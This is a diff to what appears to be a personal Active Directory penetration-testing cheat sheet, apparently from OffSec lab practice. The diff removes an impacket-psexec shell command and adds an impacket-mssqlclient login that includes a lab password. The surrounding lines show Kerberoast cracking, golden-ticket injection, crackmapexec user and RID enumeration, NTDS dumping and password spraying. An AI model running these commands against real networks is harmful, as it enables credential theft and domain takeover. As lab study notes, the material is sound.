@@ -125,10 +125,6 @@ python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~
 ### Lateral Movement
 /ticket - optional - filename for output the ticket - default is: ticket.kirbi.  
 /ptt - no output in file, just inject the golden ticket in current session.
-###### Get shell with clear password
-```
-impacket-psexec offsec.local/allison@192.168.151.59
-```
 ###### Crackmapexec
 ```
 Failed logins result in a [-]
@@ -151,6 +147,9 @@ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --users
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --rid-brute
 cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
 proxychains4 -f /etc/proxychains4.conf smbclient //172.16.196.13/IPC$(sharename) -U offsec%lab
+
+mssql:
+impacket-mssqlclient relia.com/dnnuser:DotNetNukeDatabasePassword\!@192.168.192.248 -port 49965
 
 password spray:
 cme protocol ip.txt -u user1 user2 user3 -p pass1 pass2 pass3 
